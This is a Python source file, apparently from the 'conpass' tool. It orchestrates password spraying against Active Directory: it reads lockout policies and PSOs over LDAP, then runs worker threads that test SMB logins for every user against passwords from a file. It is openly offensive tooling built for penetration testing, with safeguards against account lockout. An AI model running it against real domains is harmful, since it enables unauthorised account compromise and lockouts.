"""Password spray orchestrator - coordinates the spray operation."""

import queue
import signal
import threading
import time
from pathlib import Path

from rich.console import Console
from rich.progress import (
    BarColumn,
    MofNCompleteColumn,
    Progress,
    TaskProgressColumn,
)
from rich.table import Table

from conpass.config import SprayConfig
from conpass.core.worker import Worker, WorkItem
from conpass.models import Credentials, PasswordPolicy, User
from conpass.services.database import DatabaseService
from conpass.services.ldap import LdapService
from conpass.services.policy import PolicyService
from conpass.services.smb import SmbService


class SprayOrchestrator:
    """Main orchestrator for password spraying operations."""

    def __init__(
        self,
        config: SprayConfig,
        credentials: Credentials | None,
        console: Console
    ):
        self.config = config
        self.credentials = credentials
        self.console = console

        # Services
        self.ldap_service: LdapService | None = None
        self.policy_service: PolicyService | None = None
        self.database_service: DatabaseService | None = None
        self.time_delta = None
        self.dc_host = None
        self.dc_ip = None

        # Spray state
        self.users: list[User] = []
        self.default_policy: PasswordPolicy | None = None
        self.psos: list[PasswordPolicy] = []

        # Threading
        self.work_queue: queue.Queue = queue.Queue(maxsize=100 if config.limit_memory else 0)
        self.workers: list[Worker] = []
        self.stop_event = threading.Event()
        self.lockout_event = threading.Event()

        # Progress tracking
        self.completed_count = 0
        self.completed_lock = threading.Lock()
        self.connected_workers = 0
        self.connected_workers_lock = threading.Lock()

        # Setup signal handlers
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)

    def run(self) -> None:
        """Main entry point for spray operation."""
        self._display_warning()
        self._gather_information()

        if self.config.disable_spray:
            self.console.print(
                "[yellow]Password spraying skipped: no password file provided or explicitly disabled.[/yellow]"
            )
            return

        self._start_spray()

    def _display_warning(self) -> None:
        """Display important warnings."""
        self.console.rule('Important information')
        self.console.print(
            "[yellow]This tool does its best to find the effective password policy "
            "but may be wrong. Use with caution.[/yellow]"
        )
        self.console.print(
            "[yellow]Emergency command:[/yellow] "
            "[red]Search-ADAccount -LockedOut | Unlock-ADAccount[/red]"
        )

    def _gather_information(self) -> None:
        """Gather domain information and build user list."""
        self.console.rule('Gathering info')

        # Get DC details
        if not self.config.dc_ip:
            if self.config.debug:
                self.console.print(f"[cyan][DEBUG] Resolving DC details for domain: {self.config.domain}[/cyan]")
            self.dc_host, self.dc_ip = SmbService.get_dc_details(self.config.domain, self.config.dns_ip)
            if self.config.debug:
                self.console.print(f"[cyan][DEBUG] Resolved DC: {self.dc_host} ({self.dc_ip})[/cyan]")
        else:
            self.dc_ip = self.config.dc_ip
            self.dc_host = self.config.dc_host or self.dc_ip
            if self.config.debug:
                self.console.print(f"[cyan][DEBUG] Using provided DC: {self.dc_host} ({self.dc_ip})[/cyan]")

        # Get time delta
        if self.config.debug:
            self.console.print(f"[cyan][DEBUG] Getting time delta with DC: {self.dc_ip}[/cyan]")
        self.time_delta = SmbService.get_time_delta(self.dc_ip)
        self.console.print(
            f"Time difference with '{self.dc_host}' ({self.dc_ip}): "
            f"{self.time_delta.total_seconds()} seconds"
        )

        # Initialize database service if configured
        if self.config.use_database:
            if self.config.debug:
                self.console.print(f"[cyan][DEBUG] Initializing database: {self.config.database_path}[/cyan]")
            self.database_service = DatabaseService(self.config.database_path, self.config.domain)
            self.database_service.connect()

            # Display database statistics
            stats = self.database_service.get_stats()
            self.console.print(
                f"[cyan]Database statistics: {stats['total']} tests recorded "
                f"({stats['successful']} successful, {stats['failed']} failed)[/cyan]"
            )
            if stats['successful'] > 0:
                successful_creds = self.database_service.get_successful_credentials()
                self.console.print(f"[green]Found {len(successful_creds)} previously successful credentials in database[/green]")

        if self.config.is_online_mode:
            if self.config.debug:
                self.console.print("[cyan][DEBUG] Running in online mode (with LDAP)[/cyan]")
            self._gather_online_mode()
        else:
            if self.config.debug:
                self.console.print("[cyan][DEBUG] Running in offline mode (no LDAP)[/cyan]")
            self._gather_offline_mode()

    def _gather_online_mode(self) -> None:
        """Gather information in online mode (with LDAP access)."""
        # Create LDAP service
        if self.config.debug:
            self.console.print(f"[cyan][DEBUG] Creating LDAP service (base_dn={self.config.base_dn}, use_ssl={self.config.use_ssl})[/cyan]")
        self.ldap_service = LdapService(
            credentials=self.credentials,
            base_dn=self.config.base_dn,
            dc_ip=self.dc_ip,
            use_ssl=self.config.use_ssl,
            page_size=self.config.ldap_page_size,
            timeout=self.config.timeout,
            dns_ip=self.config.dns_ip,
            console=self.console,
            debug=self.config.debug
        )

        # Connect to all DCs
        if self.config.debug:
            self.console.print(f"[cyan][DEBUG] Connecting to all Domain Controllers via LDAP[/cyan]")
        self.ldap_service.connect()
        all_dc_ips = self.ldap_service.get_dc_ips()
        self.console.print(
            f"Successfully connected to Domain Controllers {all_dc_ips} via LDAP"
        )

        # Create policy service
        if self.config.debug:
            self.console.print(f"[cyan][DEBUG] Creating policy service (security_threshold={self.config.security_threshold})[/cyan]")
        self.policy_service = PolicyService(
            ldap_service=self.ldap_service,
            security_threshold=self.config.security_threshold,
            time_delta=self.time_delta,
            console=self.console
        )

        # Load policies
        if self.config.debug:
            self.console.print(f"[cyan][DEBUG] Loading password policies from LDAP[/cyan]")
        self.policy_service.load_policies()
        self.default_policy = self.policy_service.get_default_policy()
        self.psos = self.policy_service.get_psos()

        if self.config.debug:
            self.console.print(f"[cyan][DEBUG] Loaded default policy: lockout_threshold={self.default_policy.lockout_threshold}, "
                             f"lockout_window={self.default_policy.lockout_window_seconds}s[/cyan]")
            if self.psos:
                self.console.print(f"[cyan][DEBUG] Loaded {len(self.psos)} PSO(s)[/cyan]")
                for pso in self.psos:
                    self.console.print(f"[cyan][DEBUG]   - {pso.name}: lockout_threshold={pso.lockout_threshold}, "
                                     f"lockout_window={pso.lockout_window_seconds}s[/cyan]")

        # Build user list
        user_filter = self._read_user_file() if self.config.user_file else None
        if self.config.debug:
            if user_filter:
                self.console.print(f"[cyan][DEBUG] Using user filter from file: {len(user_filter)} user(s)[/cyan]")
            else:
                self.console.print(f"[cyan][DEBUG] Building user list from LDAP (no user filter)[/cyan]")
        self.users = self.policy_service.build_user_list(user_filter)

        # Display policies
        self._display_policies()

        # Display user count
        self.console.print(f"[bold green]Total sprayed users: {len(self.users)}[/bold green]")
        if self.config.debug:
            policies_distribution = {}
            for user in self.users:
                policy_name = user.policy.name
                policies_distribution[policy_name] = policies_distribution.get(policy_name, 0) + 1
            self.console.print(f"[cyan][DEBUG] User distribution by policy:[/cyan]")
            for policy_name, count in policies_distribution.items():
                self.console.print(f"[cyan][DEBUG]   - {policy_name}: {count} user(s)[/cyan]")

    def _gather_offline_mode(self) -> None:
        """Gather information in offline mode (no LDAP access)."""
        from datetime import datetime, timezone

        self.console.print(
            "[yellow]Building users list based on provided password policy. "
            "No online checks will be made.[/yellow]"
        )

        # Create manual policy
        if self.config.debug:
            self.console.print(f"[cyan][DEBUG] Creating manual policy (lockout_threshold={self.config.manual_lockout_threshold}, "
                             f"lockout_window={self.config.manual_lockout_observation_window}s)[/cyan]")
        self.default_policy = PasswordPolicy(
            name="Manual Domain Policy",
            lockout_threshold=self.config.manual_lockout_threshold,
            lockout_window_seconds=self.config.manual_lockout_observation_window
        )

        # Display policy
        table = Table()
        table.add_column('Name')
        table.add_column('Lockout Threshold')
        table.add_column('Lockout Window (s)')
        table.add_column('Lockout Duration (s)')
        table.add_column('Min Pwd Length')
        table.add_column('Pwd History')
        table.add_column('Max Pwd Age (d)')
        table.add_column('Min Pwd Age (d)')
        table.add_column('Complexity')
        table.add_row(
            self.default_policy.name,
            str(self.default_policy.lockout_threshold),
            str(self.default_policy.lockout_window_seconds),
            str(self.default_policy.lockout_duration_seconds),
            str(self.default_policy.min_pwd_length),
            str(self.default_policy.pwd_history_length),
            str(self.default_policy.max_pwd_age_days),
            str(self.default_policy.min_pwd_age_days),
            "Yes" if self.default_policy.complexity_enabled else "No"
        )
        self.console.print(table)

        # Build user list from file
        if self.config.debug:
            self.console.print(f"[cyan][DEBUG] Reading user list from file: {self.config.user_file}[/cyan]")
        usernames = self._read_user_file()
        if self.config.debug:
            self.console.print(f"[cyan][DEBUG] Read {len(usernames)} user(s) from file[/cyan]")

        self.users = [
            User(
                samaccountname=username,
                dn=None,
                policy=self.default_policy,
                bad_password_count=0,
                bad_password_time=datetime(1970, 1, 1, tzinfo=timezone.utc),
                time_delta=self.time_delta,
                security_threshold=self.config.security_threshold,
            )
            for username in usernames
        ]

        self.console.print(f"[bold green]Total sprayed users: {len(self.users)}[/bold green]")

    def _display_policies(self) -> None:
        """Display password policies in a table."""
        self.console.rule('Password Policies')

        table = Table()
        table.add_column('Name')
        table.add_column('Lockout Threshold')
        table.add_column('Lockout Window (s)')
        table.add_column('Lockout Duration (s)')
        table.add_column('Min Pwd Length')
        table.add_column('Pwd History')
        table.add_column('Max Pwd Age (d)')
        table.add_column('Min Pwd Age (d)')
        table.add_column('Complexity')
        table.add_column('Nb of enabled users')

        # Default policy
        table.add_row(
            "Default Domain Policy",
            str(self.default_policy.lockout_threshold),
            str(self.default_policy.lockout_window_seconds),
            str(self.default_policy.lockout_duration_seconds),
            str(self.default_policy.min_pwd_length),
            str(self.default_policy.pwd_history_length),
            str(self.default_policy.max_pwd_age_days),
            str(self.default_policy.min_pwd_age_days),
            "Yes" if self.default_policy.complexity_enabled else "No",
            str(len([u for u in self.users if u.policy.is_default]))
        )

        # PSOs
        if self.policy_service and self.policy_service.can_read_pso():
            pso_user_counts = self.policy_service.get_pso_user_counts()
            for pso in self.psos:
                user_count = pso_user_counts.get(pso.name, 0)
                table.add_row(
                    pso.name,
                    str(pso.lockout_threshold),
                    str(pso.lockout_window_seconds),
                    str(pso.lockout_duration_seconds),
                    str(pso.min_pwd_length),
                    str(pso.pwd_history_length),
                    str(pso.max_pwd_age_days),
                    str(pso.min_pwd_age_days),
                    "Yes" if pso.complexity_enabled else "No",
                    str(user_count)
                )
        elif self.policy_service:
            # Can't read PSO details, just show names
            pso_user_counts = self.policy_service.get_pso_user_counts()
            for pso_name, count in pso_user_counts.items():
                table.add_row(pso_name, 'N/A', 'N/A', str(count))

        self.console.print(table)

    def _read_user_file(self) -> list[str]:
        """Read usernames from user file."""
        if not self.config.user_file:
            return []

        usernames = []
        with open(self.config.user_file) as f:
            for line in f:
                username = line.strip()
                if username and not username.isspace():
                    usernames.append(username)
        return usernames

    def _start_spray(self) -> None:
        """Start the password spraying operation."""
        self.console.rule('Password Spraying')

        # Start workers
        self._start_workers()

        # Wait for all workers to connect
        self._wait_for_workers_connection()

        # Feed work queue with passwords
        self._feed_work_queue()

        # Wait for completion
        self.work_queue.join()

        # Stop workers
        self.stop_event.set()
        for worker in self.workers:
            worker.join(timeout=1)

    def _start_workers(self) -> None:
        """Start worker threads."""
        for i in range(self.config.max_threads):
            # Create services for this worker
            ldap_service = None
            if self.config.is_online_mode:
                ldap_service = LdapService(
                    credentials=self.credentials,
                    base_dn=self.config.base_dn,
                    dc_ip=self.dc_ip,
                    use_ssl=self.config.use_ssl,
                    page_size=self.config.ldap_page_size,
                    timeout=self.config.timeout,
                    dns_ip=self.config.dns_ip,
                    console=None,  # Don't pass console to workers to avoid display conflicts
                    debug=False  # Don't pass debug to workers to avoid display conflicts
                )

            smb_service = SmbService(
                dc_ip=self.dc_ip,
                domain=self.config.domain,
                console=self.console
            )

            # Create worker
            worker = Worker(
                worker_id=i + 1,
                work_queue=self.work_queue,
                ldap_service=ldap_service,
                smb_service=smb_service,
                console=self.console,
                online_mode=self.config.is_online_mode,
                stop_event=self.stop_event,
                lockout_event=self.lockout_event,
                database_service=self.database_service,
                completed_count_ref=(self, 'completed_count', 'completed_lock'),
                connected_workers_ref=(self, 'connected_workers', 'connected_workers_lock'),
                debug=self.config.debug
            )

            worker.start()
            self.workers.append(worker)

    def _wait_for_workers_connection(self) -> None:
        """Wait for all workers to connect with a progress bar."""
        from rich.progress import Progress, BarColumn, MofNCompleteColumn, TextColumn

        total_workers = len(self.workers)

        with Progress(
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            MofNCompleteColumn(),
            console=self.console,
            transient=True
        ) as progress:
            task = progress.add_task("Connecting workers...", total=total_workers)

            while True:
                with self.connected_workers_lock:
                    connected = self.connected_workers

                progress.update(task, completed=connected)

                if connected >= total_workers:
                    break

                time.sleep(0.1)

        self.console.print(f"[green]✓ All {total_workers} workers connected")

    def _feed_work_queue(self) -> None:
        """Read passwords from file and feed work queue, monitoring for new passwords."""
        seen_passwords = set()
        total_tests = 0
        last_file_check = 0

        # Monitor progress while workers are working
        with Progress(
            "[progress.description]{task.description}",
            BarColumn(),
            MofNCompleteColumn(),
            TaskProgressColumn(),
            console=self.console
        ) as progress:
            task = progress.add_task("Spraying passwords", total=total_tests)

            # Add user-as-pass tests if enabled
            if self.config.user_as_pass:
                added_tests = 0
                skipped_tests = 0
                for user in self.users:
                    if self.stop_event.is_set() or self.lockout_event.is_set():
                        break

                    password = user.samaccountname

                    # Skip if already tested in database (but count it as completed)
                    if self.database_service and self.database_service.is_already_tested(user.samaccountname, password):
                        skipped_tests += 1
                        # Increment completed count for already-tested credentials
                        with self.completed_lock:
                            self.completed_count += 1
                        if self.config.debug:
                            was_successful = self.database_service.was_successful(user.samaccountname, password)
                            status_str = "SUCCESS" if was_successful else "FAILED"
                            self.console.print(f"[bright_black]⊘ Skipping {user.samaccountname}/{password} - already tested ({status_str})[/bright_black]")
                        continue

                    work_item = WorkItem(user=user, password=password)
                    self.work_queue.put(work_item)
                    seen_passwords.add(password)
                    added_tests += 1

                # Total = all tests (added + skipped)
                total_tests = added_tests + skipped_tests
                progress.update(task, total=total_tests)
                if skipped_tests > 0:
                    self.console.print(f"[cyan]Added {added_tests} user-as-pass tests, {skipped_tests} already completed (total: {total_tests})[/cyan]")
                else:
                    self.console.print(f"[cyan]Added user-as-pass tests, total tests: {total_tests}[/cyan]")

            while any(w.is_alive() for w in self.workers):
                if self.stop_event.is_set() or self.lockout_event.is_set():
                    break

                # Check for new passwords every second if password file exists
                if self.config.password_file:
                    current_time = time.time()
                    if current_time - last_file_check >= 1.0:
                        last_file_check = current_time
                        new_passwords = self._read_new_passwords(seen_passwords)

                        if new_passwords:
                            # Add new passwords to queue
                            added_per_password = {}
                            for password in new_passwords:
                                if self.stop_event.is_set() or self.lockout_event.is_set():
                                    break

                                added_for_this_pwd = 0
                                skipped_for_this_pwd = 0
                                for user in self.users:
                                    if self.stop_event.is_set() or self.lockout_event.is_set():
                                        break

                                    # Skip if already tested in database (but count it as completed)
                                    if self.database_service and self.database_service.is_already_tested(user.samaccountname, password):
                                        skipped_for_this_pwd += 1
                                        # Increment completed count for already-tested credentials
                                        with self.completed_lock:
                                            self.completed_count += 1
                                        continue

                                    work_item = WorkItem(user=user, password=password)
                                    self.work_queue.put(work_item)
                                    added_for_this_pwd += 1

                                seen_passwords.add(password)
                                added_per_password[password] = (added_for_this_pwd, skipped_for_this_pwd)
                                # Total includes both added and skipped tests
                                total_tests += added_for_this_pwd + skipped_for_this_pwd

                            # Update progress bar with new total
                            progress.update(task, total=total_tests)
                            total_skipped = sum(skipped for _, skipped in added_per_password.values())
                            total_added = sum(added for added, _ in added_per_password.values())
                            if total_skipped > 0:
                                self.console.print(f"[cyan]Added {len(new_passwords)} new password(s): {total_added} tests queued, {total_skipped} already completed (total: {total_tests})[/cyan]")
                            else:
                                self.console.print(f"[cyan]Added {len(new_passwords)} new password(s), total tests: {total_tests}[/cyan]")
                else:
                    # No password file - check if all work is done
                    if self.work_queue.empty():
                        with self.completed_lock:
                            if self.completed_count >= total_tests:
                                # All work is done, stop workers
                                break

                # Update completed count
                with self.completed_lock:
                    completed = self.completed_count

                progress.update(task, completed=completed)

                # All current work completed and queue is empty
                if (
                    self.work_queue.empty()
                    and completed >= total_tests
                ):
                    break

                time.sleep(0.5)

        self.console.print("[green]Spray completed![/green]")

    def _read_new_passwords(self, seen_passwords: set) -> list[str]:
        """Read password file and return only new passwords not in seen_passwords."""
        new_passwords = []

        try:
            with open(self.config.password_file) as f:
                for line in f:
                    password = line.strip()
                    if password and not password.isspace() and password not in seen_passwords:
                        new_passwords.append(password)
        except FileNotFoundError:
            # File might have been deleted, ignore
            pass
        except Exception:
            # Other errors, ignore and continue
            pass

        return new_passwords

    def _signal_handler(self, signum, frame) -> None:
        """Handle interrupt signals."""
        self.console.print("[red]** Interrupted! **[/red]")
        self.stop_event.set()
        exit(0)
